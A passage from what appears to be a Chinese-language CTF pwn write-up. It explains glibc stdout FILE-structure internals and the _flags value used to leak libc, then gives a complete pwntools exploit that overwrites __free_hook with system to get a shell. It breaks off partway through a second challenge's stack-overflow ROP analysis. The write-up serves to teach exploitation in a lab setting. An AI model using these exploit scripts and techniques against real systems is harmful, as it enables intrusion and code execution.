
```cpp
int \_IO\_new\_file\_overflow( FILE \*f, int ch )
{
if ( f->\_flags & \_IO\_NO\_WRITES ) /\* SET ERROR \*/
{
f->\_flags |= \_IO\_ERR\_SEEN;
\_\_set\_errno( EBADF );
return(EOF);
}
/\* If currently reading or no buffer allocated. \*/
if ( (f->\_flags & \_IO\_CURRENTLY\_PUTTING) == 0 || f->\_IO\_write\_base == NULL )
{
/\* Allocate a buffer if needed. \*/
if ( f->\_IO\_write\_base == NULL )
{
\_IO\_doallocbuf( f );
\_IO\_setg( f, f->\_IO\_buf\_base, f->\_IO\_buf\_base, f->\_IO\_buf\_base );
}
/\* Otherwise must be currently reading.
\* If \_IO\_read\_ptr (and hence also \_IO\_read\_end) is at the buffer end,
\* logically slide the buffer forwards one block (by setting the
\* read pointers to all point at the beginning of the block). This
\* makes room for subsequent output.
\* Otherwise, set the read pointers to \_IO\_read\_end (leaving that
\* alone, so it can continue to correspond to the external position). \*/
if ( \_\_glibc\_unlikely( \_IO\_in\_backup( f ) ) )
{
size\_t nbackup = f->\_IO\_read\_end - f->\_IO\_read\_ptr;
\_IO\_free\_backup\_area( f );
f->\_IO\_read\_base -= MIN( nbackup,
f->\_IO\_read\_base - f->\_IO\_buf\_base );
f->\_IO\_read\_ptr = f->\_IO\_read\_base;
}
if ( f->\_IO\_read\_ptr == f->\_IO\_buf\_end )
f->\_IO\_read\_end = f->\_IO\_read\_ptr = f->\_IO\_buf\_base;
f->\_IO\_write\_ptr = f->\_IO\_read\_ptr;
f->\_IO\_write\_base = f->\_IO\_write\_ptr;
f->\_IO\_write\_end = f->\_IO\_buf\_end;
f->\_IO\_read\_base = f->\_IO\_read\_ptr = f->\_IO\_read\_end;
f->\_flags |= \_IO\_CURRENTLY\_PUTTING;
if ( f->\_mode <= 0 && f->\_flags & (\_IO\_LINE\_BUF | \_IO\_UNBUFFERED) )
f->\_IO\_write\_end = f->\_IO\_write\_ptr;
}
if ( ch == EOF )
return(\_IO\_do\_write( f, f->\_IO\_write\_base,
f->\_IO\_write\_ptr - f->\_IO\_write\_base ) );
if ( f->\_IO\_write\_ptr == f->\_IO\_buf\_end ) /\* Buffer is really full \*/
if ( \_IO\_do\_flush( f ) == EOF )
return(EOF);
\*f->\_IO\_write\_ptr++ = ch;
if ( (f->\_flags & \_IO\_UNBUFFERED)
|| ( (f->\_flags & \_IO\_LINE\_BUF) && ch == '\n') )
if ( \_IO\_do\_write( f, f->\_IO\_write\_base,
f->\_IO\_write\_ptr - f->\_IO\_write\_base ) == EOF )
return(EOF);
return( (unsigned char) ch);
}
```

满足一定的条件会调用 `\_IO\_do\_write() -> \_IO\_new\_do\_write()` 函数：

```cpp
int \_IO\_new\_do\_write (FILE \*fp, const char \*data, size\_t to\_do)
{
return (to\_do == 0
|| (size\_t) new\_do\_write (fp, data, to\_do) == to\_do) ? 0 : EOF;
}
```

它会继续调用 `new\_do\_write()` 函数：

```cpp
static size\_t new\_do\_write( FILE \*fp, const char \*data, size\_t to\_do )
{
size\_t count;
if ( fp->\_flags & \_IO\_IS\_APPENDING )
/\* On a system without a proper O\_APPEND implementation,
\* you would need to sys\_seek(0, SEEK\_END) here, but is
\* not needed nor desirable for Unix- or Posix-like systems.
\* Instead, just indicate that offset (before and after) is
\* unpredictable. \*/
fp->\_offset = \_IO\_pos\_BAD;
else if ( fp->\_IO\_read\_end != fp->\_IO\_write\_base )
{
off64\_t new\_pos
= \_IO\_SYSSEEK( fp, fp->\_IO\_write\_base - fp->\_IO\_read\_end, 1 );
if ( new\_pos == \_IO\_pos\_BAD )
return(0);
fp->\_offset = new\_pos;
}
count = \_IO\_SYSWRITE( fp, data, to\_do );
if ( fp->\_cur\_column && count )
fp->\_cur\_column = \_IO\_adjust\_column( fp->\_cur\_column - 1, data, count ) + 1;
\_IO\_setg( fp, fp->\_IO\_buf\_base, fp->\_IO\_buf\_base, fp->\_IO\_buf\_base );
fp->\_IO\_write\_base = fp->\_IO\_write\_ptr = fp->\_IO\_buf\_base;
fp->\_IO\_write\_end = (fp->\_mode <= 0
&& (fp->\_flags & (\_IO\_LINE\_BUF | \_IO\_UNBUFFERED) )
? fp->\_IO\_buf\_base : fp->\_IO\_buf\_end);
return(count);
}
```

此时，会出现多种情况：

- 文件流处于追加模式，即 `fp->\_flags & \_IO\_IS\_APPENDING` 成立，会直接调用 `\_IO\_SYSWRITE()` 函数。

- 文件流不处于追加模式，读写指针不同步（读缓冲区未清空），即 `fp->\_IO\_read\_end != fp->\_IO\_write\_base` 。先调用`\_IO\_SYSSEEK()`调整偏移，跟进返回值决定是否调用`\_IO\_SYSWRITE()`。

- 文件流不处于追加模式，读写指针同步，即 `fp->\_IO\_read\_end == fp->\_IO\_write\_base` ，直接调用 `\_IO\_SYSWRITE()`。

而 `\_IO\_SYSWRITE()`会将`\_IO\_write\_base`开始位置的缓冲区内容输出，我们的最终目的是调用它。

因此需要满足以下条件：

- 当 `\_IO\_write\_end` > `\_IO\_write\_ptr` 时，说明缓冲区还没有被写满，此时程序会先将输出的内容写到缓冲区，缓冲区满后再进行输出。为了不必要的麻烦，我们一般会让这两个指针相等，这样程序会直接调用`\_IO\_new\_file\_overflow()`函数继续处理。

- 在`\_IO\_new\_file\_overflow()`函数中，`f->\_flags & \_IO\_NO\_WRITES `不能成立，否则会返回错误。

- 在`\_IO\_new\_file\_overflow()`函数中，`(f->\_flags & \_IO\_CURRENTLY\_PUTTING) == 0` 不能成立，否则程序会认为当前没有正在写缓冲区，会重新初始化缓冲区导致内容消失。

- 在`new\_do\_write()`函数中，我们直接让 `fp->\_IO\_read\_end == fp->\_IO\_write\_base` 即可满足条件并成功调用`\_IO\_SYSWRITE()`函数。

其中，`\_IO\_CURRENTLY\_PUTTING = 0x1000`、`\_IO\_IS\_APPENDING = 0x800`、`\_IO\_IS\_APPENDING = 0x80`、`\_IO\_NO\_WRITES = 0x8`。

因此，我们在覆盖`stdout`时，`\_flag`字段应该为 `0xfbad1800（同时，fp->\_IO\_read\_end == fp->\_IO\_write\_base）` 或 `0xfbad1880` 即可。

编写脚本泄露libc地址：

```python
# stdout leak libc
p.sendlineafter(b'5. Exit\n', b'4')
p.sendlineafter(b'index:\n', b'-8')
# \_flags = 0xfbad1880
# \_IO\_read\_ptr = \_IO\_read\_base = \_IO\_read\_end = 0
p.sendafter(b'Enter a new username:\n', p32(0xfbad1880) + p32(0) + p64(0) \* 3 + p8(0x8))
libc\_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1ec980
libc.address = libc\_base
success("libc\_base = " + hex(libc\_base))
```

获取了libc基地址后，如何利用呢？继续向上寻址，发现bss段存在一个`a -> b -> a`的指针：

![image-20250807181630912](upload/attach/202508/912098\_2NUGCS69SCWZKPX.png)

我们可以继续利用`eidt()`函数的漏洞，修改`heap[-11]`位置指针指向的内容，将其改为`\_\_free\_hook`。

此时，`\_\_dso\_handle -> \_\_free\_hook`，我们再次修改`heap[-11]`位置指针指向的内容，即可修改`\_\_free\_hook`。

常规套路，我们修改`\_\_free\_hook`为`system`，然后调用`delete()`函数即可拿下shell。

脚本如下所示：

```python
# 创建一个chunk存储/bin/sh
p.sendlineafter(b'5. Exit', b'1')
p.sendafter(b'Enter your username:', b'/bin/sh')
# \_\_dso\_handle -> \_\_free\_hook
p.sendlineafter(b'5. Exit', b'4')
p.sendlineafter(b'index:', b'-11')
p.sendafter(b'Enter a new username:', p64(libc.sym['\_\_free\_hook']))
# \_\_free\_hook -> system
p.sendlineafter(b'5. Exit', b'4')
p.sendlineafter(b'index:', b'-11')
p.sendafter(b'Enter a new username:', p64(libc.sym['system']))
# system("/bin/sh")
p.sendlineafter(b'5. Exit', b'2')
p.sendlineafter(b'index:', b'0')
```

## exp

```python
from pwn import \*
elf = ELF("./user")
libc = ELF("./libc.so.6")
p = process([elf.path])
# p = remote('pss.idss-cn.com', 24447)
context(arch=elf.arch, os=elf.os)
context.log\_level = 'debug'
# stdout leak libc
p.sendlineafter(b'5. Exit\n', b'4')
p.sendlineafter(b'index:\n', b'-8')
p.sendafter(b'Enter a new username:\n', p32(0xfbad1880) + p32(0) + p64(0) \* 3 + p8(0x8))
libc\_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1ec980
libc.address = libc\_base
success("libc\_base = " + hex(libc\_base))
# gdb.attach(p, 'b \*$rebase(0x162B)\nc')
# pause()
# \_\_dso\_handle -> \_\_free\_hook -> system
p.sendlineafter(b'5. Exit', b'1')
p.sendafter(b'Enter your username:', b'/bin/sh')
p.sendlineafter(b'5. Exit', b'4')
p.sendlineafter(b'index:', b'-11')
p.sendafter(b'Enter a new username:', p64(libc.sym['\_\_free\_hook']))
p.sendlineafter(b'5. Exit', b'4')
p.sendlineafter(b'index:', b'-11')
p.sendafter(b'Enter a new username:', p64(libc.sym['system']))
p.sendlineafter(b'5. Exit', b'2')
p.sendlineafter(b'index:', b'0')
p.interactive()
```

# account

## 前言

题目名：account

解题数：121

题目描述：无

知识点：数组越界访问、栈溢出、32位ROP

## 逆向分析

题目逻辑非常简单，只有一个`vuln()`函数：

![image-20250807191623752](https://bbs.kanxue.com/upload/attach/202508/912098_D3QUZGSQY34YVW9.png)

我们输入的数据被存储到`v0`变量中，这里把`v0[0]`也识别成后续数组的一部分了，我们对其修复，把`v0`类型改成非数组即可：

![image-20250807191735782](https://bbs.kanxue.com/upload/attach/202508/912098_T2TQZ3V2ARVTS7W.png)

## 漏洞分析

`vuln()`函数会循环读取我们的4字节输入，然后修改`v1[v2++] = v0`，从`v1[0]`逐渐向栈中高地址处增长，这里存在栈溢出漏洞。

如果增长的次数足够多，我们可以覆盖`old_rbp`、`ret_addr`等数据。思路非常简单，我们直接向返回地址处写入ROP即可。

需要注意一点：修改`v1[10]`即修改变量`v2`，它是数组当前循环的下标，我们需要写入一个合法的值，否则会出错。

先将`v1`数组写满，然后修改`v2`变量为13（下次循环会修改`v1[14]`位置，即存储返回地址的位置）：

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7 | `for` `i` `in` `range``(``10``):`  `p.sendline(b``'57005'``)` `# 0x1234`  `sleep(``0.2``)`    `# overwrite idx->13`  `p.sendline(b``'13'``)`  `sleep(``0.2``)` |

然后，写入第一次rop泄露libc地址：

|  |  |
| --- | --- |
